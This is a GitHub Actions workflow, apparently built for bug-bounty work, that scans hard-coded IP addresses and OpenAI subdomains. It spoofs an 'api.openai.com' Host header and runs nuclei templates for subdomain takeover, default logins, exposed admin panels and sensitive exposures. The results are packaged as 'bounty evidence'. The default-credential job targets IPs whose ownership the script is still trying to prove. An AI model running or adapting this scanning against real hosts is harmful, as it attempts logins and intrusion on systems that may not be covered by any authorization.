name: OpenAI Zero-Denial pari 
on:
  workflow_dispatch:

jobs:
  strike-suite:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        # Running 3 specialized parallel engines
        engine: [takeover-verification, credential-audit, ownership-proof]
    
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Install Professional Arsenal
        run: |
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          sudo apt-get install -y whois
          echo "$HOME/go/bin" >> $GITHUB_PATH

      # ENGINE 1: Ownership Proof (The "Anti-Denial" Layer)
      - name: Generate Undeniable Ownership Evidence
        if: matrix.engine == 'ownership-proof'
        run: |
          mkdir -p evidence
          cat <<EOF > target_list.txt
          13.125.127.14
          43.202.58.124
          43.202.58.199
          43.202.58.155
          43.202.58.133
          EOF
          
          while read ip; do
            echo "--- PROOF FOR $ip ---" >> evidence/ownership_report.txt
            whois $ip | grep -iE "OrgName|NetName|Organization|Address|Country" >> evidence/ownership_report.txt
            echo "HTTP Banner Analysis:" >> evidence/ownership_report.txt
            curl -I -s -H "Host: api.openai.com" --connect-timeout 5 $ip | grep -iE "Server|X-Powered-By|Set-Cookie" >> evidence/ownership_report.txt
            echo -e "\n" >> evidence/ownership_report.txt
          done < target_list.txt

      # ENGINE 2: Takeover & DNS Validation
      - name: Verify Dangling Subdomains
        if: matrix.engine == 'takeover-verification'
        run: |
          mkdir -p evidence
          # List from your manual 'host' command findings
          cat <<EOF > dangling_subs.txt
          13cdn.openai.com
          aapi.openai.com
          alpha.openai.com
          example-resource.azure.openai.com
          your-company.azure.openai.com
          billing.openai.com
          dev.openai.com
          EOF
          
          # Nuclei with -me (Manual Evidence) captures the actual response body
          nuclei -l dangling_subs.txt -t http/takeovers/ -me evidence/takeover_poc/ -o evidence/takeover_results.txt

      # ENGINE 3: The Jackpot Hunt (Creds & Vulns)
      - name: Default Credential & Exposure Audit
        if: matrix.engine == 'credential-audit'
        run: |
          mkdir -p evidence
          cat <<EOF > origins.txt
          43.202.58.124
          43.202.58.199
          13.125.127.14
          EOF

          # Verify it's not a catch-all before wasting time
          while read ip; do
            RANDOM_PATH="check_$(date +%s)"
            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: api.openai.com" "$ip/$RANDOM_PATH")
            if [ "$STATUS" != "200" ]; then
              echo "[+] $ip is VALID for testing. Starting Nuclei Strike..."
              # Target Default Credentials, Admin Panels, and Sensitive Exposures
              nuclei -u "http://$ip" -H "Host: api.openai.com" \
                -t http/default-logins/ \
                -t http/exposed-panels/ \
                -t http/exposures/ \
                -severity critical,high,medium \
                -rate-limit 15 -o evidence/vulnerabilities_found.txt
            else
              echo "[-] $ip is a CATCH-ALL. Skipping to prevent false positives."
            fi
          done < origins.txt

      - name: Upload Bounty Evidence Package
        uses: actions/upload-artifact@v4
        with:
          name: openai-evidence-${{ matrix.engine }}
          path: evidence/
          
